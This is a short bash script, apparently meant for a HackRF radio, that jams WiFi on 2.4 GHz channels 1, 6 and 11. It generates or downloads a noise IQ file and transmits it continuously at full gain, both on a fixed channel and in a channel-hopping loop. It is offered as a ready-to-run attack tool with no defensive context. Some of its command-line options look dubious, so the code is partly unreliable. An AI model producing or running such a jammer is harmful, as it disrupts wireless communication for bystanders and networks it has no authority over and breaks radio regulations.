#!/bin/bash
# save as hackrf_jammer.sh

# 1. Generate 20MHz noise IQ file (WiFi Ch6)
siggen -f 2437000000 -r 20M -n 60 -m qam64 -o wifi_noise.iq
# OR download pre-made: wget https://github.com/radiosd/HackRF/raw/master/jammer/noise.iq

# 2. Continuous jamming loop
while true; do
    hackrf_transfer -t wifi_noise.iq -f 2437000000 -s 20M -a 1 -x 47 -c 0
done

# Channel hopping version
channels=(2412000000 2437000000 2462000000)  # Ch1,6,11
for i in {1..1000}; do
    ch=${channels[$((i%3))]}
    echo "Jamming $ch Hz..."
    hackrf_transfer -t noise.iq -f $ch -s 20M -a 1 -x 47 --txvga 47 --send 3000000
    sleep 0.3
done